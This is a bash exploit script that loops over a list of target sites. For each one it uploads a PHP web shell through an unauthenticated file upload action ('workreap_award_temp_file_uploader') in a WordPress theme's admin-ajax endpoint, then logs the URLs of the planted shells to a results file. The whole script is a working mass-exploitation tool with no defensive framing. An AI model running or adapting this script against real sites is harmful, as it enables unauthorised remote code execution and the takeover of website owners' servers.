#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: ./exploit.sh [TARGETS_LIST_PATH]"
    exit 1
fi

for i in $(cat $1);
do
        if [ $(curl -F 'action=workreap_award_temp_file_uploader' -F award_img=@shell.php "$i/wp-admin/admin-ajax.php" 2>/dev/null | grep "File uploaded!" | wc -l) = 1 ]
        then
                echo -e "$i Exploited! \n --> SHELL: $i/wp-content/uploads/workreap-temp/shell.php"
                echo "$i/wp-content/uploads/workreap-temp/shell.php" >> result.txt
        else
                echo "$i Not Vuln!";
        fi
done
